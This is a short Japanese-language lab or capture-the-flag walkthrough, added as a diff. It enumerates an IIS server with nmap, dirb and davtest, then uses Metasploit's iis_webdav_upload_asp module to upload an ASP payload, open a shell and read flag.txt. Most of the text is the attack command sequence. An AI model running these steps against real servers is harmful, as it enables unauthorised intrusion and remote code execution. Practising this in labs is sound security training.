@@ -1,0 +1,22 @@
+Demo WebDAV Metasploit
+1) nmapでセキュリティホールの探索
+2) IISサーバーが開いているポート80に対して、詳細にポートスキャンを以下のコマンドで行う
+nmap --script http-enum -sV -p 80 ターゲットドメイン
+＊時間がかかる場合は、dirb ターゲットドメインで調査する
+3) 以下のコマンドを使って、適切に保護されているかを確認する
+davtest -url http://ターゲットドメイン/webdav
+4) クレデンシャルがある場合は以下のコマンドで認証を行う
+davtest -auth ユーザー名:パスワード -url http://ドメイン名/webdav
+5) Metasploitを使って、IIS WebDAVエクスプロイトモジュールを使用して、エクスプロイトする
+msfconsole
+use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS
+set HttpUsername
+set HttpPassword
+set PATH /webdav/metasploit%RAND%.asp
+exploit
+6) フラグを読み取る
+shell
+cd /
+dir
+type flag.txt
